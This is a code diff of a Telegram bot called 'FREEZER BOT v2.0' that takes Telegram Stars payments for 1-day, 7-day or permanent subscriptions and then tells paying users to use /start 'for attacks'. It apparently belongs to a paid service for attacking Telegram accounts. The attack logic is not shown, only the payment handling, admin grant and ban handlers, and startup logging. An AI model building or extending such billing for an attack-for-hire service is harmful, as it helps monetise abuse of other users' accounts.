 async def pre_checkout_handler(event):
     query = event.query
@@ -870,53 +754,68 @@ async def pre_checkout_handler(event):
             success=True,
             error=None
         ))
-        logger.info(f"Precheckout OK: user={query.user_id}, payload={query.payload}")
+        logger.info(f"Precheckout OK: user={query.user_id}")
     except Exception as e:
         logger.error(f"Precheckout error: {e}")
 
 @bot.on(events.Raw())
 async def raw_update_handler(event):
     update = event.update
-    
     try:
-        if hasattr(update, 'message'):
-            msg = update.message
-            if hasattr(msg, 'action'):
-                action = msg.action
-                if hasattr(action, 'currency') and action.currency == 'XTR':
-                    if hasattr(action, 'payload') and action.payload:
-                        payload = action.payload.decode()
-                        
-                        uid = None
-                        if hasattr(msg, 'peer_id') and hasattr(msg.peer_id, 'user_id'):
-                            uid = msg.peer_id.user_id
-                        
-                        if uid and payload in ("sub_1d", "sub_7d", "sub_forever"):
-                            prices = {
-                                "sub_1d": (1, "1 день"),
-                                "sub_7d": (7, "7 дней"),
-                                "sub_forever": ('forever', "Навсегда")
-                            }
-                            
-                            if payload in prices:
-                                days, title = prices[payload]
-                                add_sub(uid, days)
-                                
-                                try:
-                                    await bot.send_message(
-                                        uid,
-                                        f"✅ **Оплата прошла успешно!**\n\n"
-                                        f"💎 Списано: {action.total_amount} ⭐\n"
-                                        f"📅 Тариф: {title}\n\n"
-                                        f"Подписка активирована!\n"
-                                        f"Используйте /start для атак.",
-                                        buttons=back_button()
-                                    )
-                                    logger.info(f"Subscription activated: user={uid}, plan={title}")
-                                except Exception as e:
-                                    logger.error(f"Failed to notify user {uid}: {e}")
+        # Проверяем что это сообщение
+        if not hasattr(update, 'message'):
+            return
+        msg = update.message
+        if not hasattr(msg, 'action'):
+            return
+        action = msg.action
+        
+        # Проверяем что это платёж в Stars
+        if not hasattr(action, 'currency'):
+            return
+        if action.currency != 'XTR':
+            return
+        if not hasattr(action, 'payload'):
+            return
+        if not action.payload:
+            return
+        
+        payload = action.payload.decode()
+        
+        # Получаем user_id
+        uid = None
+        if hasattr(msg, 'peer_id'):
+            if hasattr(msg.peer_id, 'user_id'):
+                uid = msg.peer_id.user_id
+        
+        if not uid:
+            return
+        
+        if payload in ("sub_1d", "sub_7d", "sub_forever"):
+            prices = {
+                "sub_1d": (1, "1 день"),
+                "sub_7d": (7, "7 дней"),
+                "sub_forever": ('forever', "Навсегда")
+            }
+            
+            if payload in prices:
+                days, title = prices[payload]
+                add_sub(uid, days)
+                
+                try:
+                    await bot.send_message(
+                        uid,
+                        f"✅ **Оплата прошла!**\n\n"
+                        f"💎 Тариф: {title}\n"
+                        f"📅 Подписка активирована!\n\n"
+                        f"Используйте /start для атак.",
+                        buttons=back_button()
+                    )
+                    logger.info(f"Sub activated: user={uid}, plan={title}")
+                except Exception as e:
+                    logger.error(f"Notify error: {e}")
     except Exception as e:
-        logger.debug(f"Raw update skip: {e}")
+        pass  # Игнорируем все ошибки в raw обработчике
 
 # ==================== АДМИН ВВОД ====================
 @bot.on(events.NewMessage(func=lambda e: get_state(e.sender_id) in ('admin_sub', 'admin_ban')))
@@ -928,27 +827,12 @@ async def handle_admin_input(event):
         if len(parts) >= 2:
             try:
                 uid = int(parts[0])
-                if parts[1].lower() == 'forever':
-                    days = 'forever'
-                else:
-                    days = int(parts[1])
-                
+                days = 'forever' if parts[1].lower() == 'forever' else int(parts[1])
                 add_sub(uid, days)
                 clear_state(event.sender_id)
-                
-                u = get_user(uid)
-                sub_status = "Навсегда" if days == 'forever' else f"{days} дн. (до {datetime.fromisoformat(u['sub_end']).strftime('%d.%m.%Y')})"
-                
-                await event.reply(
-                    f"✅ Подписка выдана!\n\n"
-                    f"👤 ID: `{uid}`\n"
-                    f"📅 Срок: {sub_status}",
-                    buttons=back_button()
-                )
-            except ValueError:
-                await event.reply("❌ Неверный формат. Пример: `123456 30`")
-        else:
-            await event.reply("❌ Нужно: `ID дни`")
+                await event.reply(f"✅ Подписка выдана `{uid}`", buttons=back_button())
+            except:
+                await event.reply("❌ Неверный формат")
     
     elif state == 'admin_ban':
         try:
@@ -957,34 +841,27 @@ async def handle_admin_input(event):
             u['banned'] = not u.get('banned', False)
             update_user(uid, u)
             clear_state(event.sender_id)
-            
             status = "ЗАБАНЕН" if u['banned'] else "РАЗБАНЕН"
-            await event.reply(f"🚫 Пользователь `{uid}` {status}", buttons=back_button())
-        except ValueError:
-            await event.reply("❌ Отправьте числовой ID пользователя.")
+            await event.reply(f"🚫 `{uid}` {status}", buttons=back_button())
+        except:
+            await event.reply("❌ Неверный ID")
 
 # ==================== ЗАПУСК ====================
 async def main():
     await bot.start(bot_token=BOT_TOKEN)
     me = await bot.get_me()
-    
     logger.info("=" * 50)
-    logger.info(f"❄️  FREEZER BOT v2.0")
-    logger.info(f"🤖 Бот: @{me.username}")
-    logger.info(f"🆔 ID: {me.id}")
-    logger.info(f"⭐ Приём платежей: Telegram Stars (XTR)")
-    logger.info(f"🔐 Админ: {ADMIN_ID}")
-    logger.info(f"📦 База: {DB_FILE}")
-    logger.info(f"📋 Лог атак: {ATTACK_LOG_FILE}")
+    logger.info(f"❄️ FREEZER BOT v2.0 @{me.username}")
+    logger.info(f"🆔 Bot ID: {me.id}")
+    logger.info(f"🔐 Admin: {ADMIN_ID}")
     logger.info("=" * 50)
-    logger.info("✅ Бот запущен и готов к работе")
-    
+    logger.info("✅ Бот запущен")
     await bot.run_until_disconnected()
 
 if __name__ == '__main__':
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        logger.info("🛑 Бот остановлен")
+        logger.info("🛑 Остановлен")
     except Exception as e:
-        logger.error(f"💥 Критическая ошибка: {e}")
+        logger.error(f"💥 Ошибка: {e}")
